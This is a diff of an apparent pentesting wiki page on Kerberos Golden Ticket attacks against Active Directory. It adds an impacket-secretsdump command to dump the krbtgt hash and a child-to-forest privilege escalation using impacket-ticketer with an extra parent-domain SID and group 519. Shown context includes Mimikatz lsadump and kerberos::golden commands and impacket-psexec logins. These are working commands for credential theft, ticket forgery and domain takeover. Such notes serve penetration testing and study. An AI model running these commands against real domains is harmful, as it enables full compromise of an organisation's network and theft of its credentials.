@@ -15,13 +15,6 @@ However, what if we want to generate our own TGTs to grant us access to everythi
 
 
 
-#### Necessary Elements:
-
-* **Domain SID**
-* **NTLM hash** of **krbtgt account**
-* **Domain name**
-* **SIDS** (in Cross-Forest Attacks)
-
 #### Methodology:
 
 * Extract **Domain Admin** account's **NTML hash**
@@ -79,6 +72,11 @@ Or other ways...
 
 The second task is obtain the NTLM hash of the krbtgt account. These are the methods to obtain it:
 
+```bash
+impacket-secretsdump 'DOMAIN_USER@DC_IP'
+> PASS
+```
+
 ### LSASS
 
 ```powershell
@@ -89,9 +87,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"' -Computer $DC_NAM
 
 <figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
 
-### NT Directory Services (NTDS.dll)
 
-...
 
 ### DCsync attack
 
@@ -114,7 +110,9 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:$DOMAIN.
 ```
 {% endcode %}
 
-> id:**500** or group\_id:**512** it's a default id of administrator user in windows
+> id:**500 i**s a default id of administrator user in windows
+>
+> group\_id:**512** is a default id for domain admin group in AD
 
 
 
@@ -217,6 +215,44 @@ export KRB5CCNAME=$(pwd)/NAME.ccache
 
 impacket-psexec administrator@<DC_IP> -k -no-pass
 ```
+
+## Escalate Privilege with GoldTicket
+
+If we have a scenario where we are in a Child Domain and we have the privilege to force a Golden Ticket, we could use this technique to expand our privilege in entire Forest.
+
+### Get the Parent DC info
+
+To understand if we are under a Parent DC we can use the `impacket-GetADDomain` tool.
+
+```bash
+impacket-GetADDomain CHILD-DOMAIN/user:pass -dc-ip <child_dc_ip>
+
+# output
+
+```
+
+This returns:
+
+* Child domain name
+* Parent domain (if any)
+* Forest root
+* SID
+
+### Golden Ticket for PrivEsc creation
+
+{% code overflow="wrap" %}
+```bash
+impacket-ticketer -domain CHILD_DOMAIN -aesKey KRBTGT_AES_HASH -domain-sid CHILD_DOMAIN_SID -groups 519 -user-id USER_ID_TO_IMPERS -extra-sid PARENT_DOMAIN_SID 'usertoimpers'
+```
+{% endcode %}
+
+
+
+### Craft the ST&#x20;
+
+[#use-golden-ticket](golden-ticket.md#use-golden-ticket "mention")
+
+
 
 ## GoldenCopy
 
